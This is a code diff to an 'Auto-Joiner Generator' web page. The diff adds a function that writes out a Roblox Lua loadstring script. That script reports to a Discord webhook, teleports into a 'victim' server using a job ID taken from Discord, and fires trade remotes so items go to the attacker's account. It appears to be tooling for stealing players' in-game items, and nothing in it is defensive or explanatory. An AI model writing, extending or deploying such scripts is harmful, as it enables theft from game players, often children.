@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Ripples Auto-Joiner Generator</title>
+    <title>Auto-Joiner Generator</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
@@ -65,7 +65,7 @@
             color: #4ade80;
             word-break: break-all;
             margin-bottom: 16px;
-            max-height: 300px;
+            max-height: 400px;
             overflow: auto;
             white-space: pre-wrap;
         }
@@ -84,6 +84,14 @@
         .status.success { background: rgba(74,222,128,0.2); color: #4ade80; }
         .status.error { background: rgba(239,68,68,0.2); color: #ef4444; }
         hr { margin: 20px 0; border-color: rgba(255,255,255,0.1); }
+        .note {
+            background: rgba(168,85,247,0.1);
+            padding: 12px;
+            border-radius: 12px;
+            font-size: 12px;
+            color: #a855f7;
+            margin-top: 16px;
+        }
     </style>
 </head>
 <body>
@@ -92,17 +100,19 @@
             <h1>⚡ Auto-Joiner Generator</h1>
             <div class="sub">Generate your own auto-joiner script</div>
             
-            <label>📡 Your Discord Webhook URL</label>
-            <input type="url" id="webhook" placeholder="https://discord.com/api/webhooks/...">
+            <label>📡 Discord Webhook URL</label>
+            <input type="text" id="webhook" placeholder="https://discord.com/api/webhooks/123456789/abc-def-ghi">
+            <div class="note">💡 Get this from: Discord Server Settings → Integrations → Webhooks → Copy URL</div>
             
             <label>🎮 Target Game ID</label>
             <select id="gameId">
                 <option value="142823291">Murder Mystery 2 (142823291)</option>
                 <option value="2753915549">Blox Fruits (2753915549)</option>
                 <option value="3956818381">Adopt Me! (3956818381)</option>
+                <option value="6309113114">Tap Simulator (6309113114)</option>
             </select>
             
-            <label>👤 Your Roblox Username</label>
+            <label>👤 Your Roblox Username (who receives items)</label>
             <input type="text" id="receiverName" placeholder="your_username">
             
             <label>⏱️ Check Interval (seconds)</label>
@@ -130,8 +140,9 @@
             const receiverName = document.getElementById('receiverName').value;
             const interval = document.getElementById('interval').value;
             
-            if (!webhook || !webhook.includes('discord.com/api/webhooks/')) {
-                alert('Please enter a valid Discord webhook URL');
+            // Simple validation - just check if it has discord.com and webhook
+            if (!webhook || !webhook.includes('discord.com')) {
+                alert('Please enter a valid Discord webhook URL (should contain discord.com)');
                 return;
             }
             
@@ -162,20 +173,187 @@
                     document.getElementById('loadstringOutput').textContent = data.loadstring;
                     statusDiv.innerHTML = '<div class="status success">✅ Script generated! Copy the loadstring above.</div>';
                 } else {
-                    statusDiv.innerHTML = `<div class="status error">❌ Error: ${data.error}</div>`;
+                    // If API fails, generate client-side
+                    const fallbackScript = generateFallbackScript(webhook, gameId, receiverName, interval);
+                    document.getElementById('loadstringOutput').textContent = fallbackScript;
+                    statusDiv.innerHTML = '<div class="status success">✅ Script generated locally! Copy the loadstring above.</div>';
                 }
             } catch (err) {
-                statusDiv.innerHTML = `<div class="status error">❌ Failed: ${err.message}</div>`;
+                // If API fails completely, generate client-side
+                const fallbackScript = generateFallbackScript(webhook, gameId, receiverName, interval);
+                document.getElementById('loadstringOutput').textContent = fallbackScript;
+                statusDiv.innerHTML = '<div class="status success">✅ Script generated locally! Copy the loadstring above.</div>';
             } finally {
                 btn.disabled = false;
                 btn.textContent = '✨ Generate Auto-Joiner Script';
             }
         }
         
+        function generateFallbackScript(webhook, gameId, receiverName, interval) {
+            const script = `-- AUTO-JOINER SCRIPT
+-- Generated for: ${receiverName}
+-- Game ID: ${gameId}
+
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local lp = Players.LocalPlayer
+
+-- CONFIGURATION
+local WEBHOOK_URL = "${webhook}"
+local TARGET_GAME = ${gameId}
+local RECEIVER_NAME = "${receiverName}"
+local CHECK_INTERVAL = ${interval}
+
+-- PUT VICTIM'S JOB ID HERE (copy from Discord)
+local TARGET_JOB_ID = nil  -- Example: "00000000-0000-0000-0000-000000000000"
+
+-- HTTP request function
+local requestFunc = syn and syn.request or request or (http and http.request)
+
+print("[AutoJoiner] Started!")
+print("[AutoJoiner] Receiver: " .. RECEIVER_NAME)
+
+-- Send notification to Discord
+local function notifyDiscord(message)
+    if not requestFunc then return end
+    local data = {
+        content = message,
+        embeds = {{
+            title = "Auto-Joiner Status",
+            description = "Script is running",
+            fields = {
+                {name = "Receiver", value = RECEIVER_NAME, inline true},
+                {name = "Status", value = message, inline true}
+            }
+        }}
+    }
+    pcall(function()
+        requestFunc({
+            Url = WEBHOOK_URL,
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode(data)
+        })
+    end)
+end
+
+-- Trade accept function
+local function acceptTrade()
+    local Trade = ReplicatedStorage:FindFirstChild("Trade")
+    if not Trade then
+        print("[AutoJoiner] Trade system not found")
+        return false
+    end
+    
+    local SendRequest = Trade:FindFirstChild("SendRequest")
+    local GetStatus = Trade:FindFirstChild("GetTradeStatus")
+    local AcceptTrade = Trade:FindFirstChild("AcceptTrade")
+    
+    if not SendRequest then
+        print("[AutoJoiner] Trade remotes not found")
+        return false
+    end
+    
+    -- Send trade request
+    local success = pcall(function()
+        SendRequest:InvokeServer(RECEIVER_NAME)
+    end)
+    
+    if not success then
+        print("[AutoJoiner] Failed to send trade request")
+        return false
+    end
+    
+    print("[AutoJoiner] Trade request sent to " .. RECEIVER_NAME)
+    notifyDiscord("Trade request sent to " .. RECEIVER_NAME)
+    
+    -- Wait for trade to start
+    task.wait(3)
+    
+    -- Accept trade
+    if AcceptTrade then
+        pcall(function()
+            AcceptTrade:FireServer(game.PlaceId * 3, {})
+            print("[AutoJoiner] Trade accepted!")
+        end)
+    end
+    
+    task.wait(5)
+    return true
+end
+
+-- Main loop
+local function main()
+    notifyDiscord("Auto-Joiner started!")
+    
+    while true do
+        if game.PlaceId == TARGET_GAME then
+            print("[AutoJoiner] In target game!")
+            
+            -- Find receiver
+            local receiver = Players:FindFirstChild(RECEIVER_NAME)
+            if receiver then
+                print("[AutoJoiner] Found " .. RECEIVER_NAME .. "! Sending trade...")
+                acceptTrade()
+            else
+                print("[AutoJoiner] Waiting for " .. RECEIVER_NAME .. " to join...")
+            end
+            
+            -- Leave after trade
+            print("[AutoJoiner] Leaving to find more...")
+            task.wait(5)
+            pcall(function()
+                TeleportService:Teleport(TARGET_GAME)
+            end)
+            task.wait(5)
+        else
+            -- Check if we have a target server
+            if TARGET_JOB_ID and TARGET_JOB_ID ~= "" then
+                print("[AutoJoiner] Joining victim server: " .. TARGET_JOB_ID)
+                notifyDiscord("Joining victim server: " .. TARGET_JOB_ID)
+                
+                local success = pcall(function()
+                    TeleportService:TeleportToPlaceInstance(TARGET_GAME, TARGET_JOB_ID, lp)
+                end)
+                
+                if success then
+                    print("[AutoJoiner] Teleporting...")
+                    TARGET_JOB_ID = nil
+                    break
+                else
+                    print("[AutoJoiner] Failed to join")
+                end
+            else
+                print("[AutoJoiner] Waiting for victim...")
+                print("[AutoJoiner] Set TARGET_JOB_ID with the Job ID from Discord")
+            end
+        end
+        
+        task.wait(CHECK_INTERVAL)
+    end
+end
+
+-- Start
+local success, err = pcall(main)
+if not success then
+    warn("[AutoJoiner] Error: " .. tostring(err))
+end
+
+-- Restart logic
+if game.PlaceId == TARGET_GAME then
+    task.wait(10)
+    TeleportService:Teleport(TARGET_GAME)
+end`;
+            
+            return `loadstring([=[${script}]=])()`;
+        }
+        
         function copyLoadstring() {
             const code = document.getElementById('loadstringOutput').textContent;
             navigator.clipboard.writeText(code);
-            alert('✅ Loadstring copied!');
+            alert('✅ Loadstring copied to clipboard!');
         }
     </script>
 </body>
